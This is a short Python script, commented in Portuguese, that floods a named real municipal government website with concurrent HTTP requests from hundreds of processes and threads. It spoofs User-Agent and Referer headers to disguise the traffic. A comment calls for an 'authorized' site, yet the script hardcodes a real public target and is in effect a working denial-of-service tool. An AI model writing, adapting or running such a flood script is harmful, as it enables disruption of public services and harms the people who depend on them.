import requests
import random
import time
import multiprocessing
import threading

def send_request(url):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
    ]

    referers = [
        "https://www.youtube.com/",
        "https://www.pornhub.com/",
        "https://www.xvideos.com/",
        "https://www.netflix.com/",
        "https://www.facebook.com/",
        "https://www.instagram.com/"
    ]

    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': random.choice(referers)
    }

    try:
        response = requests.get(url, headers=headers)
        print(f"Response from {url}: {response.status_code}")
    except Exception as e:
        print(f"Error accessing {url}: {str(e)}")

def main():
    url = "https://www.guaruja.sp.gov.br/"  # Substitua com o site autorizado
    num_processes = 472
    num_threads = 628
    duration = 300  # segundos

    start_time = time.time()

    # Usando multiprocessing para enviar requisições simultaneamente
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=send_request, args=(url,))
        p.start()
        processes.append(p)

    # Usando threading para enviar requisições simultaneamente
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url,))
        t.start()
        threads.append(t)

    # Aguarda até que todas as threads e processos terminem ou até atingir a duração máxima
    for p in processes:
        p.join()

    for t in threads:
        t.join()

    end_time = time.time()
    print(f"Total time taken: {end_time - start_time} seconds")

if __name__ == "__main__":
    main()